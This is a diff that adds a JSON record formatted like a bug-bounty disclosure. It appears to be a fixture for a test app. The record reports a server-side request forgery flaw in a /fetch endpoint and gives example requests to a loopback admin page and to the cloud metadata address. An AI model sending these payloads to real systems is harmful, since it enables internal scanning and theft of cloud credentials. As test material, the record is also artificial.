@@ -1,0 +1,14 @@
+{
+  "id": 900006,
+  "title": "SSRF via fetch Endpoint Allows Internal Network Scanning and Cloud Metadata Access",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "visibility": "full",
+  "team": {"handle": "resurface-testapp", "name": "Resurface Test App"},
+  "reporter": {"username": "demo_hacker"},
+  "weakness": {"id": 68, "name": "Server-Side Request Forgery (SSRF)"},
+  "vulnerability_information": "## Summary\nThe `/fetch` endpoint accepts a `url` parameter and makes server-side HTTP requests to the specified URL. There is no validation or filtering on the target URL, allowing an attacker to make requests to internal services, cloud metadata endpoints, and other resources not normally accessible from the internet.\n\n## Steps to Reproduce\n1. Navigate to the target application\n2. Use the fetch endpoint to access an internal URL:\n   ```\n   GET /fetch?url=http://127.0.0.1:9999/admin/debug\n   ```\n3. The server fetches the URL and returns the response content\n4. Try cloud metadata endpoint:\n   ```\n   GET /fetch?url=http://169.254.169.254/latest/meta-data/\n   ```\n5. The server makes the request from its network context, bypassing firewalls\n\n## Proof of Concept\n```http\nGET /fetch?url=http://127.0.0.1:9999/admin/debug HTTP/1.1\nHost: target.com\n```\n\nResponse contains internal configuration data fetched server-side.\n\nAlternatively:\n```http\nGET /fetch?url=http://127.0.0.1:9999/health HTTP/1.1\nHost: target.com\n```\n\nResponse shows the health check of the local service.\n\n## Impact\n- Access to internal services and APIs behind firewalls\n- Cloud metadata theft (AWS/GCP/Azure credentials)\n- Internal network scanning and service enumeration\n- Reading configuration from internal endpoints\n- Potential for chaining with other vulnerabilities for RCE",
+  "disclosed_at": "2025-09-05T11:00:00.000Z",
+  "bounty_amount": "2500.0"
+}
